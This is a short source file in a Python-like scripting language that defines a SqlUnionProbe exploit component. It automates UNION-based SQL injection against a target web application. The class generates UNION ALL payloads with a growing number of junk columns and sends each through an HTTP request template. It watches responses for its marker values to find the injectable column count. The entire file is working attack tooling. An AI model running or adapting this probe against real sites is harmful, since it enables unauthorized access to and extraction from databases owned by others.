class init ExploitComponent SqlUnionProbe {
    emitter: SqlEmitter(),
    
    __init__: @(httpTemplate, maxColumns = 0x20) { },
    
    findOutput: @() {
        self.emitter = SqlEmitter();
        columns = 0;
        
        while (true) {
            columns++;
            
            cols = range(0, columns)
                @select(@(x) self.emitter.junkString());
                
            quote = cols[0][0];
            colVals = cols @select(@(x) x.lstrip(quote).rstrip(quote));
            injection = self.createInjection(cols);
            values = { sqli: injection };
            get = self.httpTemplate.getUrl(values);
            self.log('[?] requesting %s\r\n' % get);
            post = self.httpTemplate.getPost(values);
            resp = urllib2.urlopen(get, post).read();    
                
            if (colVals @any(resp.__contains__)) {
                self.log('Match!\r\n\r\n');
                ret columns;                
            }
            
            if (columns >= self.maxColumns) ret -1;
        }
    },
    
    createInjection: @(cols) Injection(
        self.emitter.quote(),
        self.emitter.comment(),
        @() self.emitter.unionAll(cols)),
};